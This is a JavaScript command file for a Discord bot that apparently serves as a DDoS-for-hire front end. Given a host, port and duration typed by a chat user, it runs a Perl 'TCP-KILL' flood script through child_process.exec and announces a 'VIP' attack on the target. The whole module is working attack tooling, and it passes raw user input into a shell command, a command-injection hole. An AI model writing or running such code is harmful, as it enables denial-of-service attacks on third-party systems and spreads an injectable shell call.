const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const duration = message.content.split (" ")[3]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

// Example command
if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('HELP ATTACK !')
	.setDescription("```;Help : Check Lệnh !``` \n ```;Methods : Xem Lệnh Attack !``` \n ```;Geoip : Check Ip WebSite !```")
	.setFooter("Developer By : Nguyễn Xuân Trường !")
	.setTimestamp()
	message.channel.send(embed1);
	return;
	}

// Command attack
var exec = require('child_process').exec
exec(`perl TCP-KILL.pl ${host} ${port} 65500 ${duration}`, (error, stdout, stderr) => {
});

// Start Attacking
setTimeout(function(){ 
    console.log('Start Attacking ID Discord:' +  message.guild.id)

const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('💀 **RABBIT NXT** 💀')
	.setTimestamp()
  .setDescription("**𝓟𝓵𝓪𝓷**: `VIP 🎃` \n **𝐓𝐚𝐫𝐠𝐞𝐭** : `" + host + "` \n **𝐌𝐞𝐭𝐡𝐨𝐝𝐬** : `TCP-KILL🤡` \n **𝐓𝐈𝐌𝐄** : `" + duration + "`")
	.setFooter('© Developer: Rabbitx#6150', client.user.avatarURL)
	.setTimestamp()
	.setImage(attackgif)
	.setThumbnail("")
 message.channel.send(embed);
 }, 5000); //time in milliseconds 1000 milliseconds = 1 seconds

// Attack Gif
var gifler = ["https://j.gifs.com/2kRnmP.gif", "https://media1.nguoiduatin.vn/thumb_x640x384/media/truong-cong-hieu/2019/06/15/bom-tsar-bomba.gif"];
    var attackgif = gifler[Math.floor((Math.random() * gifler.length))];

// Verify Gif
var gify = ["https://cdn.weasyl.com/static/media/d5/a0/8f/d5a08f3f771a8c3efa3749cdfab5bda6853ba9f22dc5fe70f053595b6f480468.gif"];
		var loadinggif = gify[Math.floor((Math.random() * gify.length))];

// Start Verify
console.log('Start Verify ID Discord:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('💀 **RABBIT NXT** 💀')
	.setTimestamp()
	.setDescription("**► 𝐖𝐚𝐢𝐭 𝐟𝐨𝐫 𝐭𝐡𝐞 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧 ~~ **")
	.setFooter('© Developer: Rabbitx#6150', client.user.avatarURL)
	.setTimestamp()
	.setImage(loadinggif)
	.setThumbnail("")
 message.channel.send(embed);
  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['Help'],
  permLevel: 0
}

exports.help = {
  name: 'Help',
  description: 'Rabbitx',
  usage: 'Help'
}
